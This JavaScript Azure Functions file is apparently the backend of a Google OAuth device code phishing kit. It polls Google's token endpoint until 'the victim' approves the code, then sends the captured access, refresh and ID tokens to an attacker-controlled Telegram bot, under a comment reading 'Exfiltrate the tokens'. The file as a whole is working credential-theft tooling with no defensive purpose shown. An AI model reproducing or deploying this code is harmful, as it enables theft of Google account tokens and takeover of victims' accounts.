/**
 * Google Device Code poller
 * Polls the Google OAuth token endpoint until the victim completes
 * the device code flow on google.com/device.
 */

const { app } = require("@azure/functions");
const axios = require("axios");

const client_id = process.env.GOOGLE_CLIENT_ID || "407408718192.apps.googleusercontent.com";
const client_secret = process.env.GOOGLE_CLIENT_SECRET || ""; // Optional for some client IDs
const token_endpoint = "https://oauth2.googleapis.com/token";
const telegram_bot_token = process.env.TELEGRAM_BOT_TOKEN;
const telegram_chat_id = process.env.TELEGRAM_CHAT_ID;

async function dispatchTelegram(message) {
  if (telegram_bot_token && telegram_chat_id) {
    const url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegram_chat_id,
        text: message,
        parse_mode: "HTML",
      }),
    })
      .then((r) =>
        r.ok
          ? console.log("Telegram dispatch OK")
          : console.error(`Telegram dispatch failed: ${r.statusText}`)
      )
      .catch((e) => console.error("Telegram dispatch error:", e));
  }
}

app.http("poll", {
  methods: ["PUT"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {
    const request_body = await request.json();
    context.log(`Received device code for polling: ${JSON.stringify(request_body)}`);

    const deviceCode = request_body.device_code;
    const interval = request_body.interval || 5;
    const maxAttempts = Math.floor(300 / interval); // ~5 minutes total
    let tokenResult = null;
    let pollCount = 0;

    while (!tokenResult && pollCount++ < maxAttempts) {
      await new Promise((resolve) => setTimeout(resolve, interval * 1000));

      const params = {
        client_id: client_id,
        grant_type: "urn:ietf:params:oauth:grant-type:device_code",
        code: deviceCode,
      };
      if (client_secret) params.client_secret = client_secret;

      tokenResult = await axios
        .post(token_endpoint, new URLSearchParams(params).toString(), {
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
        })
        .then((response) => response.data)
        .catch((ex) => {
          const err = ex.response?.data;
          if (err?.error === "authorization_pending") {
            context.log(`Waiting for user... (attempt ${pollCount}/${maxAttempts})`);
          } else if (err?.error === "slow_down") {
            // Google asks us to slow down — respect the new interval
            context.log("Google requested slow_down, extending delay");
          } else {
            context.error("Poll error:", err || ex.message);
          }
          return null;
        });
    }

    if (tokenResult) {
      context.log(`Token obtained! ${JSON.stringify(tokenResult)}`);

      // Exfiltrate the tokens
      let msg = `✅ <b>Google Device Code Token Captured!</b>\n\n`;
      if (tokenResult.access_token) {
        msg += `<b>Access Token:</b> <code>${tokenResult.access_token}</code>\n`;
      }
      if (tokenResult.refresh_token) {
        msg += `<b>Refresh Token:</b> <code>${tokenResult.refresh_token}</code>\n`;
      }
      if (tokenResult.id_token) {
        msg += `<b>ID Token:</b> <code>${tokenResult.id_token.substring(0, 80)}...</code>\n`;
      }
      msg += `\n<b>Scope:</b> ${tokenResult.scope || "N/A"}`;
      msg += `\n<b>Expires in:</b> ${tokenResult.expires_in || "N/A"}s`;

      dispatchTelegram(msg);
    } else {
      context.log("Polling completed — no token obtained (user didn't authenticate or timeout)");
    }

    return new Response(null, { status: 204 });
  },
});